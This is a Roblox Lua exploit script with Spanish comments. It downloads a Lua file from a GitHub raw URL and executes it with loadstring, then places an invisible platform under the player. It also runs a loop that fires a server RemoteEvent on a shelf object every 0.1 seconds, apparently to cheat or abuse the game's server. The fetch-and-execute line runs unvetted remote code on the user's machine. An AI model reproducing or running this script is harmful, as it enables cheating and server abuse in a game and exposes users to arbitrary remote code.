local success, script = pcall(function()
    return game:HttpGet("https://raw.githubusercontent.com/AnonyProArg/ScriptsRobloz/main/Pasteler%C3%ADa/ExeC1.lua")
end)

if success then
    loadstring(script)()
else
    print("Error al obtener el script desde la URL")
end

local function createPlatform()
    local player = game.Players.LocalPlayer
    local character = player.Character or player.CharacterAdded:Wait()

    local platform = Instance.new("Part")
    platform.Name = "Platform"
    platform.Size = Vector3.new(10, 1, 10) -- Tamaño de la plataforma
    platform.Position = character.HumanoidRootPart.Position - Vector3.new(0, 3, 0) -- Posición debajo del jugador
    platform.Transparency = 1 -- Hacer la plataforma invisible
    platform.CanCollide = false -- Desactivar colisión para la plataforma
    platform.Parent = workspace

    local bodyPosition = Instance.new("BodyPosition") -- Crear una instancia de BodyPosition para mantener la plataforma debajo del jugador
    bodyPosition.Position = platform.Position
    bodyPosition.MaxForce = Vector3.new(math.huge, math.huge, math.huge) -- Establecer una fuerza máxima alta para mantener la plataforma en su lugar
    bodyPosition.Parent = platform

    player.CharacterAdded:Connect(function(newCharacter)
        character = newCharacter
        platform.Position = character.HumanoidRootPart.Position - Vector3.new(0, 3, 0) -- Actualizar la posición de la plataforma cuando el jugador cambie de personaje
        bodyPosition.Position = platform.Position -- Actualizar la posición de BodyPosition para seguir al jugador
    end)
end

local function keepPlayerOnPlatform()
    local player = game.Players.LocalPlayer
    local character = player.Character or player.CharacterAdded:Wait()

    local humanoid = character:WaitForChild("Humanoid")
    humanoid.PlatformStand = true -- Mantener al jugador en posición de plataforma

    humanoid:GetPropertyChangedSignal("FloorMaterial"):Connect(function()
        humanoid.PlatformStand = true -- Asegurarse de que el jugador se mantenga en posición de plataforma incluso si cambia el material del suelo
    end)
end

local spamThread = spawn(function()
    while wait(0.1) do
        workspace.Plots.Plot1.Shelf.Info:FireServer()
    end
end)

createPlatform()
keepPlayerOnPlatform()
